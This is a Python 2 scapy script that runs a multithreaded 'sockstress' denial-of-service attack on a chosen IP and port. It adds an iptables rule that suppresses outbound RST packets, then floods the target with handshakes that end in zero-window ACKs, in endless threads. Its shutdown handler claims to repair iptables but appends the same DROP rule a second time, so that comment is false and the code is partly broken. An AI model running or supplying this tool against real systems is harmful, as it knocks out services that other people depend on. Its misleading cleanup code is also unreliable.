#!/usr/bin/python

from scapy.all import *
from time import sleep
import thread
import logging
import os
import signal
import sys
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

if len(sys.argv) != 4:
	print 'Usage - {} [Target-IP] [Port number] [Threads]'
	print 'Example - {} 10.0.0.5 21 20'
	print 'Example will perform a 20x multi-threaded sock-stress DoS attack against the FTP (port 21) service on 10.0.0.5'
	print '\n*** NOTE ***'
	print 'Make sure you target a port that responds when a connection is made'
	sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])


## This is where the magic happens
def sockstress(target, dstport):
	while True:
		try:
			x = random.randint(0, 65535)
			response = sr1(IP(dst=target)/TCP(sport=x, dport=dstport, flags='S'), timeout=1, verbose=0)
			send(IP(dst=target)/TCP(dport=dstport, sport=x, window=0, flags='A', ack=(response[TCP].seq + 1))/'\x00\x00', verbose=0)
		except:
			pass


## Graceful shutdown allows IP table Repair
def graceful_shutdown(signal, frame):
	print '\nYou pressed CTRL-C'
	print 'Fixing IP tables'
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
	sys.exit()


## Create IP Tables rule to prevent outbound RST packet to allow scapy TCP connection
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)

## Spin up multiple threads to launch the attack
print '\nThe onslaught has begun ... use CTRL-C to stop the attack'
for x in range(0, threads):
	thread.start_new_thread(sockstress, (target, dstport))

## Make it go FOREVER (... or at least until CTRL-C)
while True:
	sleep(1)
